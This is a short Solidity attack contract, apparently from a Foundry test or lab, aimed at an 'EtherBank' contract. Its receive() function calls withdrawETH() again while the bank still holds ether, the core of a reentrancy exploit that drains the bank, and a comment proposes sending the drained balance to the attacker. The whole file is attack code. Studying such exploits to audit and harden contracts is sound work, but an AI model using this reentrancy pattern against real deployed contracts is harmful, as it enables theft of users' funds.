// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";

interface IEtherBank {
    function withdrawETH() external;
}

contract Attack {

    IEtherBank bank;
    address public owner;

    constructor(address _bank) {
        owner = msg.sender;
        bank = IEtherBank(_bank);
    }

    fallback() external payable {
    
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdrawETH();
        }
        // can add else statement and directly send bank's balance to attacker owner
    }

}